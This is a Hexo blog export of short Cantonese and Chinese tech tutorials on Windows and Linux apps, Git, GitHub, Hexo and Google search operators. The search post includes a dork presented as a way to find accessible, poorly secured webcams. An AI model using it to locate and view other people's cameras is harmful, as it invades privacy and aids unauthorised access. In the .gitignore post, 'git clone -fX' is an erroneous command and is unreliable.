<h3 id="Mircosoft"><a href="#Mircosoft" class="headerlink" title="Mircosoft"></a>Mircosoft</h3><p><a href='https://apps.microsoft.com/store/detail/files-app/9NGHP3DX8HDX?hl=en-sg&gl=SG'><img src='Get it from Microsoft.png' alt='Get it from Microsoft' width="284px" height="104px" /></a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>程式</tag>
      </tags>
  </entry>
  <entry>
    <title>Fluent Terminal - Windows 10 第三方 Terminal</title>
    <url>/2022/05/23/FluentTerminal-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="fluent terminal logo" src="cover.png" width="200px"/>
    <h1 align="center">Fluent Terminal</h1>
</p>

<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><ul>
<li>PowerShell、CMD、WSL 或自定義 shell 的終端</li>
<li>內置支持 SSH 和 <a href="https://mosh.org/">Mosh</a> 連接</li>
<li>支持標籤和多個窗口</li>
<li>主題和外觀配置</li>
<li>導入/導出主題</li>
<li>導入 iTerm 主題</li>
<li>可編輯的鍵綁定</li>
<li>Search Function</li>
<li>配置外殼配置文件以在不同外殼之間快速切換</li>
<li>資源管理器上下文菜單集成 <a href="https://github.com/felixse/FluentTerminal/tree/master/Explorer%20Context%20Menu%20Integration">安裝腳本可以在這裡找到</a></li>
<li>VsCode 擴展 <a href="https://marketplace.visualstudio.com/items?itemName=Xherdi.fluent-terminal">這裡</a></li>
</ul>
<h2 id="語言"><a href="#語言" class="headerlink" title="語言"></a>語言</h2><ul>
<li>阿拉伯語</li>
<li>阿拉伯語（伊拉克）</li>
<li>阿塞拜疆</li>
<li>波斯尼亞語</li>
<li>繁體中文</li>
<li>荷蘭語</li>
<li>英語</li>
<li>法語</li>
<li>德語</li>
<li>希伯來語</li>
<li>印地語</li>
<li>印尼語</li>
<li>意大利語</li>
<li>日本人</li>
<li>韓國人</li>
<li>拋光</li>
<li>葡萄牙語（巴西）</li>
<li>羅馬尼亞語</li>
<li>俄語</li>
<li>西班牙語</li>
<li>土耳其語</li>
<li>烏克蘭語</li>
</ul>
<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><img src="/2022/05/23/FluentTerminal-Apps/sc1.png" class="">
<img src="/2022/05/23/FluentTerminal-Apps/sc2.png" class="">


<h1 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h1><h3 id="Mircosoft"><a href="#Mircosoft" class="headerlink" title="Mircosoft"></a>Mircosoft</h3><p><a href='https://apps.microsoft.com/store/detail/fluent-terminal/9P2KRLMFXF9T?hl=en-sg&gl=SG'><img src='Get it from Microsoft.png' alt='Get it from Microsoft' width="284px" height="104px" /></a></p>
<h3 id="Chocolatey-package-manager-installation"><a href="#Chocolatey-package-manager-installation" class="headerlink" title="Chocolatey package manager installation"></a>Chocolatey package manager installation</h3><ul>
<li>Install <a href="https://chocolatey.org/">Chocolatey</a></li>
<li>From an elevated/admin shell, execute <code>choco install fluent-terminal</code></li>
</ul>
<h3 id="Scoop-package-manager-installation"><a href="#Scoop-package-manager-installation" class="headerlink" title="Scoop package manager installation"></a>Scoop package manager installation</h3><ul>
<li>Install Scoop</li>
<li>Install 7zip and git (to add buckets): <code>scoop install 7zip git</code></li>
<li>From an elevated/admin shell, execute<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop bucket add nonportable</span><br><span class="line">scoop install fluent-terminal-np</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Gituhb"><a href="#Gituhb" class="headerlink" title="Gituhb"></a>Gituhb</h1><p><a href="https://github.com/felixse/FluentTerminal">https://github.com/felixse/FluentTerminal</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Google AdSense - 很抱歉造成您的不便，但是我們目前無法處理您的要求。我們已將此問題告知工程師，並會儘快加以解決。</title>
    <url>/2022/06/21/GADS-Error/</url>
    <content><![CDATA[<img src="/img/Post/image/Google/adsense/gads.svg" width="200px"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>當你想進入 Google ADSense 首頁後，卻發現他說出現錯誤。</p>
<img src="/2022/06/21/GADS-Error/error.png" class="">

<h2 id="解決"><a href="#解決" class="headerlink" title="解決"></a>解決</h2><p>會造成這個錯誤是因為你瀏覽器上使用了 ADBlock 等不同的封鎖插件，只要解除插件使用後就可以正常顯示了。</p>
]]></content>
      <tags>
        <tag>問題</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>Git - .gitignore 排除上傳某啲檔案</title>
    <url>/2022/02/02/Git-gitignore/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>.gitignore，簡單黎講係排除檔案用既。</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><h2 id="建立檔案"><a href="#建立檔案" class="headerlink" title="建立檔案"></a>建立檔案</h2><p>首先起個 files 名叫 .gitignore</p>
<p>然後打你想 排除既檔案，</p>
<h3 id="單一檔案"><a href="#單一檔案" class="headerlink" title="單一檔案"></a>單一檔案</h3><p>例如你唔想 push files <code>on99.txt</code></p>
<p>咁只需要喺入面加一行叫做</p>
<p>on99.txt</p>
<h3 id="跟副檔名"><a href="#跟副檔名" class="headerlink" title="跟副檔名"></a>跟副檔名</h3><p>又或者你唔想見到全部 txt files</p>
<p>你可以加一行</p>
<p>*.txt</p>
<h3 id="指定路徑檔案"><a href="#指定路徑檔案" class="headerlink" title="指定路徑檔案"></a>指定路徑檔案</h3><p>又或者你想排除 指定路徑既檔案，</p>
<p>就咁樣打。</p>
<p>on99/dllm.exe</p>
<h3 id="指定路徑全部檔案"><a href="#指定路徑全部檔案" class="headerlink" title="指定路徑全部檔案"></a>指定路徑全部檔案</h3><p>又或者你想喺 指定路徑入面既全部檔案</p>
<p>就咁樣打。</p>
<p>dllm/*</p>
<h2 id="清除"><a href="#清除" class="headerlink" title="清除"></a>清除</h2><p>如果你唔想再排除佢地，<br>你可以用 clean 清走哂佢地。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clean -X</span><br></pre></td></tr></table></figure>

<p>強制性咁就係</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone -fX</span><br></pre></td></tr></table></figure>

<h4 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">on99.txt #排除檔案 on99.txt</span><br><span class="line"></span><br><span class="line">on99/dllm.exe #排除檔案 on99/dllm.exe</span><br><span class="line"></span><br><span class="line">*.txt #排除全部 txt 檔案</span><br><span class="line"></span><br><span class="line">dllm/* #排除 dllm folder 裡面既所有野</span><br></pre></td></tr></table></figure>

<p>More info<br><a href="https://git-scm.com/docs/gitignore">https://git-scm.com/docs/gitignore</a><br><a href="https://gitbook.tw/chapters/using-git/ignore">https://gitbook.tw/chapters/using-git/ignore</a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Pages - 驗證網域</title>
    <url>/2022/07/05/Github-Pages-Verified-domains/</url>
    <content><![CDATA[<img src="github logo.png" width="200px"/>

<h1 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h1><p>設置好 DNS 後卻沒有反應，但是又不知道要等待多久，想即時查看有沒有更新？<br>沒問題，Github Page 提供了使用 <code>TXT</code> Records 進行驗證網域的方法。<br>在開始之前請先登入你的 Github 帳號！</p>
<div class ="note warning flat">
    注意：這邊的示範只能作為已有網域的管理員作示範，使用預設的 <code>[usernmae].github.io</code> 是不能使用的，因為需要修改 DNS 內容。
</div>

<h2 id="第一步-開啟-Setting-頁面"><a href="#第一步-開啟-Setting-頁面" class="headerlink" title="第一步 - 開啟 Setting 頁面"></a>第一步 - 開啟 Setting 頁面</h2><p>請先登入 <a href="https://github.com/login">Github</a>，然後直接在右上角點擊 <code>icon</code> 然後開啟 <code>Settings</code> 頁面。</p>
<p><img src="1.gif"></p>
<h2 id="第二步-開啟-Pages-頁面"><a href="#第二步-開啟-Pages-頁面" class="headerlink" title="第二步 - 開啟 Pages 頁面"></a>第二步 - 開啟 Pages 頁面</h2><p>點擊右下角的 <code>Pages</code></p>
<p><img src="2.gif"></p>
<h2 id="第三步-Add-a-domain"><a href="#第三步-Add-a-domain" class="headerlink" title="第三步 - Add a domain"></a>第三步 - Add a domain</h2><p>點擊 <code>Add a domain</code></p>
<p><img src="3.png"></p>
<h3 id="第四步-輸入網域"><a href="#第四步-輸入網域" class="headerlink" title="第四步 - 輸入網域"></a>第四步 - 輸入網域</h3><p>輸入你的網域後，按下 <code>Add a domain</code>。</p>
<p><img src="4.gif"></p>
<h2 id="第五步-複製-TXT-記錄內容"><a href="#第五步-複製-TXT-記錄內容" class="headerlink" title="第五步 - 複製 TXT 記錄內容"></a>第五步 - 複製 TXT 記錄內容</h2><p>現在我們需要進入到你的 DNS 修改位置，我的是使用 Cloudflare ~<br>然後需要新增一條 TXT 記錄。</p>
<p><img src="5.gif"></p>
<h3 id="回到-DNS-修改位置"><a href="#回到-DNS-修改位置" class="headerlink" title="回到 DNS 修改位置"></a>回到 DNS 修改位置</h3><p>修改步驟如下：</p>
<ol>
<li>在您的 DNS 配置中為主機名創建 <code>TXT</code> 記錄：<code>_github-pages-challenge-&lt;username&gt;.&lt;domain&gt;</code></li>
<li>使用上圖說明的 code 為 <code>TXT</code> 記錄的值：<code>84281421fjwq482148129</code></li>
<li>儲存新增內容</li>
</ol>
<p><img src="6.gif"></p>
<p>像這樣：</p>
<p><img src="7.gif"></p>
<h3 id="回到-Github-Page-位置"><a href="#回到-Github-Page-位置" class="headerlink" title="回到 Github Page 位置"></a>回到 Github Page 位置</h3><p>回到 Github Page 位置後，按 <code>Verify</code>。</p>
<p><img src="8.gif"></p>
<h3 id="驗證成功"><a href="#驗證成功" class="headerlink" title="驗證成功"></a>驗證成功</h3><p>成功，如下圖。</p>
<p><img src="9.gif"></p>
]]></content>
      <categories>
        <category>Domain</category>
      </categories>
      <tags>
        <tag>Github Page</tag>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>Github - 更改用戶名稱</title>
    <url>/2022/06/07/Github-change-username/</url>
    <content><![CDATA[<h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><p>教你點改 Username.</p>
<p>先去右上角撳你既 icon 仔，<br>然後撳 <code>Settings</code>，<br>左邊 <code>Account</code>，<br>你會見到 <code>Change username</code>，<br>然後撳 <code>i understand, let&#39;s change my username</code>，<br>改你既名，<br>然後撳 <code>Change my username</code></p>
<p>呢度會開始幫你改，<br>過程要等一陣。</p>
<h2 id="影片示範"><a href="#影片示範" class="headerlink" title="影片示範"></a>影片示範</h2><img src="/2022/06/07/Github-change-username/change.gif" class="">]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>撳制</tag>
      </tags>
  </entry>
  <entry>
    <title>Github - 生產個人 access tokens</title>
    <url>/2022/02/15/Github-gen-Personal-access-tokens/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要 ACCESS Private Github Project，<br>係需要用到你既個人 tokens，<br>今篇文就係教你點樣起個 personal tokens，<br>然後再 access 你既 Private Project.</p>
<h2 id="生產個人-Access-Tokens"><a href="#生產個人-Access-Tokens" class="headerlink" title="生產個人 Access Tokens"></a>生產個人 Access Tokens</h2><p>首先去 <code>Setting</code>，<br>拉到最底搵 <code>&lt;&gt; Developer Settings</code>，<br>撳 <code>Personal access tokens</code>，<br>再撳 <code>Generate new token</code></p>
<p><code>Note</code> 就係要打你既 名稱，是但起你認到就得。<br><code>Expiration</code> 係呢條 keys 可以用到幾耐，</p>
<p><code>Select scopes</code> 就 Tick 返</p>
<ul>
<li><code>repo</code></li>
<li><code>admin:repo_hook</code></li>
<li><code>admin:gpg_key</code></li>
</ul>
<p>Tick 哂之後撳 <code>Generate token</code></p>
<p>之後你就會見到你既 tokens keys啦 ！</p>
<p>呢個 tokens keys 就係你用黎登入既密碼，<br>並唔係用你本身登入 github 個密碼黎 access ！</p>
<img src="/2022/02/15/Github-gen-Personal-access-tokens/how.gif" class="">

<h2 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h2><p>而加我會示範點樣 git clone 你既 repo.</p>
<p>首先我地要 confirm 你既 config 係打左你既 username,email<br>打呢句查下係咪有野</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global --list</span><br></pre></td></tr></table></figure>

<p>set username 入cfg.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;your_username&quot;</span><br></pre></td></tr></table></figure>

<p>set email 入 cfg.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;your_email_address@example.com&quot;</span><br></pre></td></tr></table></figure>

<p>然後照正常咁樣打，<br>但係密碼會變左你岩岩整完既 tokens keys.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/username/repo</span><br></pre></td></tr></table></figure>

<img src="/2022/02/15/Github-gen-Personal-access-tokens/gitclone.gif" class="">]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>撳制</tag>
      </tags>
  </entry>
  <entry>
    <title>Brasero CD/DVD burner - 燒碟工具</title>
    <url>/2021/12/17/Gnome-install-brasero/</url>
    <content><![CDATA[<img src="/2021/12/17/Gnome-install-brasero/cover.png" class="">

<h1 id="Brasero"><a href="#Brasero" class="headerlink" title="Brasero"></a>Brasero</h1><p>Brasero 係一個用黎燒錄資料 CD 或許 DVD，仲可以用黎整 Bootable 開機驅動器既 Linux GUI 軟件 (GNOME)。</p>
<p>【網站】：<a href="https://wiki.gnome.org/Apps/Brasero">https://wiki.gnome.org/Apps/Brasero</a><br>【語言】：英文<br>【支援】：Gnome</p>
<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ul>
<li>建立多區段的資料 CD 或 DVD</li>
<li>建立音樂 CD</li>
<li>複製 CD 或 DVD</li>
<li>燒錄 ISO 影像</li>
<li>建立多區段 CD 或 DVD</li>
</ul>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install brasero -y</span><br></pre></td></tr></table></figure>


<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2021/12/17/Gnome-install-brasero/program.png" class="">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>Gui</tag>
        <tag>Gnome</tag>
      </tags>
  </entry>
  <entry>
    <title>Gnome 安裝 Tweaks</title>
    <url>/2022/01/15/Gnome-install-tweaks/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通過使用 Tweaks 調整 Gnome Linux 以自定義其外觀。</p>
<h1 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br><span class="line">sudo apt-get install gnome-tweaks -y</span><br></pre></td></tr></table></figure>

<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/01/15/Gnome-install-tweaks/1.png" class="">

<p>參考資料:<br><a href="https://itsfoss.com/gnome-tweak-tool/">https://itsfoss.com/gnome-tweak-tool/</a></p>
]]></content>
      <categories>
        <category>Gnome</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Google Serach - 超實用指令，令你更容易尋找內容。</title>
    <url>/2022/06/24/Google-Serach-hack-skill/</url>
    <content><![CDATA[<img src="/img/Post/image/Google/google.svg" width="200px"/>

<h1 id="有關-Google-Serach"><a href="#有關-Google-Serach" class="headerlink" title="有關 Google Serach"></a>有關 Google Serach</h1><p>學會使用 Google Search 會令你的尋找速度升級幾倍，不用你再慢慢找出答案，本文章會列出比較實用的指令。</p>
<img src="/2022/06/24/Google-Serach-hack-skill/1.png" class="">

<h1 id="Site-功能"><a href="#Site-功能" class="headerlink" title="Site 功能"></a>Site 功能</h1><p>Site 功能是將你要搜尋的內容目標的只指向指定的網站。</p>
<hr>
<h2 id="例子一-全部內容"><a href="#例子一-全部內容" class="headerlink" title="例子一 (全部內容)"></a>例子一 (全部內容)</h2><p>這個示範會只尋找 <code>github.com</code> 的連結。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:github.com</span><br></pre></td></tr></table></figure>

<img src="/2022/06/24/Google-Serach-hack-skill/site.png" class="">

<h2 id="例子二-特定內容"><a href="#例子二-特定內容" class="headerlink" title="例子二 (特定內容)"></a>例子二 (特定內容)</h2><p>這個示範會尋找 <code>github.com</code> 連結當中的指定內容 (<code>hacking</code>)。</p>
<img src="/2022/06/24/Google-Serach-hack-skill/site-2.png" class="">

<h1 id="filetype-功能"><a href="#filetype-功能" class="headerlink" title="filetype 功能"></a>filetype 功能</h1><p>filetype 功能是會幫你只搜尋你想指定的檔案連結。</p>
<hr>
<h2 id="例子一-特定檔案"><a href="#例子一-特定檔案" class="headerlink" title="例子一 (特定檔案)"></a>例子一 (特定檔案)</h2><p>這個示範會顯示你想要的特定內容 (<code>hacking</code>) + 只尋找出你想要的特定內容的 <code>PDF</code> 檔案。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hacking filetype:pdf</span><br></pre></td></tr></table></figure>

<img src="/2022/06/24/Google-Serach-hack-skill/filetype.png" class="">

<h2 id="例子二-網站-特定檔案"><a href="#例子二-網站-特定檔案" class="headerlink" title="例子二 (網站 + 特定檔案)"></a>例子二 (網站 + 特定檔案)</h2><p>這個示範會只顯示 <code>github.com</code> 的 <code>PDF</code> 檔案。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:github.com filetype:pdf</span><br></pre></td></tr></table></figure>

<img src="/2022/06/24/Google-Serach-hack-skill/filetype-2.png" class="">

<h2 id="例子三-網站-特定檔案-內容"><a href="#例子三-網站-特定檔案-內容" class="headerlink" title="例子三 (網站 + 特定檔案 + 內容)"></a>例子三 (網站 + 特定檔案 + 內容)</h2><p>只搜尋網域 <code>github.com</code> 內含有關鍵字 <code>hacking</code> 的 <code>pdf</code> 檔案類型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:github.com filetype:pdf hacking</span><br></pre></td></tr></table></figure>

<img src="/2022/06/24/Google-Serach-hack-skill/filetype-3.png" class="">

<h2 id="例子四-尋找圖片-svg"><a href="#例子四-尋找圖片-svg" class="headerlink" title="例子四 (尋找圖片 svg)"></a>例子四 (尋找圖片 <code>svg</code>)</h2><p>svg 檔案是一個不會失真的圖檔，由數字去組成，這種圖片的檔案對於我這種經常性寫文章的人來說是一個福音，因為不需要擔心圖片會起格，這樣就會令文章好看多了。<br>接下來會講解如何針對性尋找 <code>svg</code> 檔案。</p>
<p>這個示範我會針對圖片檔案 <code>svg</code> 去尋找圖片檔案，然後顯示內容 <code>lihkg</code> 關鍵字的 <code>svg</code> 檔案。</p>
<div class="post-outdate-notice">
    注意 : 圖片是不能在 <code>全部</code> 內顯示 (見下圖)。</br>
</div>

<img src="/2022/06/24/Google-Serach-hack-skill/filetype-svg.png" class="">

<h3 id="怎麼才能顯示圖片？"><a href="#怎麼才能顯示圖片？" class="headerlink" title="怎麼才能顯示圖片？"></a>怎麼才能顯示圖片？</h3><p>好簡單，我們只需要由 <code>全部</code> 跳至 <code>圖片</code> 就能顯示你想搜尋的內容。</p>
<p>到達 <code>圖片</code> 後選擇你想要的圖片 <code>右鍵</code> &gt; <code>儲存圖片</code> 就會發現是 <code>svg</code> 檔案 (見下圖)。</p>
<div class="note warning flat">
    注意 : 因為是 <code>svg</code> 檔案，我也不知道什麼原因，有些檔案在 <code>圖片</code> 內顯示是 <code>png</code> 檔，</br>
    但是在網站內是顯示 <code>svg</code> 檔案，這種問題最通常的網站是 <code>wiki</code>，建議最好直接進入網站下載圖片 (svg)。
</div>

<img src="/2022/06/24/Google-Serach-hack-skill/filetype-svg-2.gif" class="">

<h1 id="intitle-功能"><a href="#intitle-功能" class="headerlink" title="intitle 功能"></a>intitle 功能</h1><p>此功能是讓你能指定尋找你想要的特定文字的標題。</p>
<hr>
<h2 id="例子一-特定標題"><a href="#例子一-特定標題" class="headerlink" title="例子一 (特定標題)"></a>例子一 (特定標題)</h2><p>示範只尋找有 <code>LIHKG</code> 的標題。</p>
<div class="note info flat">
    提示 : 如果你想更準確尋找內容，準確的指定文字，可以使用兩個雙引號 <code>""</code> 將文字包住。
</div>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:&quot;LIHKG&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/06/24/Google-Serach-hack-skill/intitle.png" class="">

<h2 id="例子二-web-cam"><a href="#例子二-web-cam" class="headerlink" title="例子二 (web cam)"></a>例子二 (web cam)</h2><p>以下示範如何找到可進入的低保安 <code>web cam</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:&quot;webcamxp 5&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/06/24/Google-Serach-hack-skill/intitle-webcam.png" class="">

<h1 id="Google-Hacking-Database"><a href="#Google-Hacking-Database" class="headerlink" title="Google Hacking Database"></a>Google Hacking Database</h1><p>如果你對以上指令有興趣，可以進入此網站查看更多指令 ~</p>
<blockquote>
<p>網址 : <a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
</blockquote>
<img src="/2022/06/24/Google-Serach-hack-skill/ghd.png" class="">

<p>參考資料<br><a href="https://www.youtube.com/embed/hrVa_dhD-iA">https://www.youtube.com/embed/hrVa_dhD-iA</a></p>
]]></content>
      <tags>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML - hr element</title>
    <url>/2022/01/22/HTML-hr/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>喺 html 世界入面，有好多唔同既 element (tag)，當中有一個係叫 <code>hr</code>，我以下示範。</p>
<h2 id="hr"><a href="#hr" class="headerlink" title="hr"></a>hr</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hr</span> <span class="attr">style</span>=<span class="string">&quot;border:2px solid grey&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p>當然你平時咁打，緊係唔係好似我呢個咁既效果，只係我用左 themes 先變成咁，原本既只係一條線。</p>
<hr style="border:2px solid grey"></hr>]]></content>
      <categories>
        <category>Hypertext</category>
      </categories>
      <tags>
        <tag>網站</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>Half-Life Model Viewer - 模型檢視器</title>
    <url>/2022/05/23/Half-Life-Model-Viewer-Apps/</url>
    <content><![CDATA[<img alt="Half-Life Model Viewer" src="cover.png" width="200px"/>

<h1 id="Half-Life-Model-Viewer"><a href="#Half-Life-Model-Viewer" class="headerlink" title="Half-Life Model Viewer"></a>Half-Life Model Viewer</h1><p>用黎睇下 Half Life 入面既 mdl 檔入面既 model 係咩樣。</p>
<p>【程式名稱】：HLMV<br>【下載網站】：<a href="https://github.com/SamVanheer/HL_Tools/releases/tag/HLMV-V2.11">按這裡</a><br>【Github】：<a href="https://github.com/SamVanheer/HL_Tools">按這裡</a></p>
<p>【程式語言】：英文</p>
<img src="/2022/05/23/Half-Life-Model-Viewer-Apps/program%201.png" class="">]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>程式</tag>
      </tags>
  </entry>
  <entry>
    <title>LogMeIn Hamachi - 建立私人網路 Lan</title>
    <url>/2022/05/20/Hamachi-create-private-network/</url>
    <content><![CDATA[<img src="main-logo.png"/>

<p>LogMeIn Hamachi 是一項託管 VPN 服務，在幾分鐘內讓您將類似 LAN 的網絡安全地擴展到分佈式團隊、移動工作人員和您的遊戲玩家朋友等。</p>
<h2 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h2><p>只需申請一個帳號，就能使用，即時為你建立屬於你的私人網路，即使你和朋友在不同的 wifi 底下，使用後即可變成同一個網路底下 (Lan)，那麼就能和你的朋友一起玩，非常簡單的就開設了伺服器。</p>
<p>而免費版最多 5 人，</p>
<ul>
<li>49$ 一年 Standard 6-32</li>
<li>199 一年 Premium 33-256</li>
<li>299 一年 Multi-Network 256/無上限</li>
</ul>
<h2 id="官方網站"><a href="#官方網站" class="headerlink" title="官方網站"></a>官方網站</h2><ul>
<li><a href="https://www.vpn.net/">https://www.vpn.net/</a></li>
</ul>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/05/20/Hamachi-create-private-network/program.png" class="">

<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>網路 ID 隨便輸入一個就可以了，密碼也是，對方要進入只需要打創建人建立的 ID 和密碼。</p>
<img src="/2022/05/20/Hamachi-create-private-network/how.png" class="">]]></content>
      <tags>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Butterfly - 檔案位置列表</title>
    <url>/2022/01/27/Hexo-Butterfly-layout-and-script-paths/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每一個 Themes 的擺位也不一樣，基於這樣我很難去每個位置都記得，所以直接寫一個記錄好了 OwO</p>
<h2 id="Layout-pug-位置"><a href="#Layout-pug-位置" class="headerlink" title="Layout pug 位置"></a>Layout pug 位置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">blog\themes\butterfly\layout\includes\head\preconnect.pug</span><br></pre></td></tr></table></figure>

<h2 id="Config-位置"><a href="#Config-位置" class="headerlink" title="Config 位置"></a>Config 位置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">blog\themes\butterfly\scripts\events\config.js</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>網站</tag>
        <tag>Framework</tag>
        <tag>Themes</tag>
        <tag>Hexo Butterfly</tag>
      </tags>
  </entry>
  <entry>
    <title>Butterfly themes 預設的圖片 Display 唔到</title>
    <url>/2022/01/24/Hexo-Butterfly-themes-image-default-cannotdisplay/</url>
    <content><![CDATA[<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>改完 <code>yml</code> file 都係出唔到圖？<br>試下 run</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<p>再試下 rerun 個 Localhost 再睇下得唔得！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server --debug</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
        <tag>Themes</tag>
        <tag>Hexo Butterfly</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - ERROR Deployer not found: git</title>
    <url>/2022/01/24/Hexo-ERROR-Deployer-not-found-git/</url>
    <content><![CDATA[<h1 id="點解？"><a href="#點解？" class="headerlink" title="點解？"></a>點解？</h1><p>只係你仲未裝要既野，<br>cd 入返去你既 blog folder 再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>之後再 clean</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<p>再試下 Push</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo deploy -m &quot;you like la&quot;</span><br></pre></td></tr></table></figure>

<p>or Nothing</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>問題</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 自動重新整理頁面 Browsersync</title>
    <url>/2022/01/30/Hexo-auto-reload-page%20browsersync/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要喺 localhost 進行網頁測試，<br>要成日 F5 F5 F5 撳都撳到好攰，<br>所以今篇文係講點樣，<br>每當你 儲存 (Ctrl + S) 後，<br>點樣自動 頁面重新整理，</p>
<p>工具有好多款，但今款我會用呢款工具 <a href="https://browsersync.io/">Browsersync</a></p>
<h2 id="官方說明"><a href="#官方說明" class="headerlink" title="官方說明"></a>官方說明</h2><blockquote>
<p>With each web page, device and browser, testing time grows exponentially. From live reloads to URL pushing, form replication to click mirroring, Browsersync cuts out repetitive manual tasks. It’s like an extra pair of hands. Customise an array of sync settings from the UI or command line to create a personalised test environment. Need more control? Browsersync is easily integrated with your web platform, build tools, and other Node.js projects.</p>
</blockquote>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>你可以選擇全唔全局安裝呢樣野先</p>
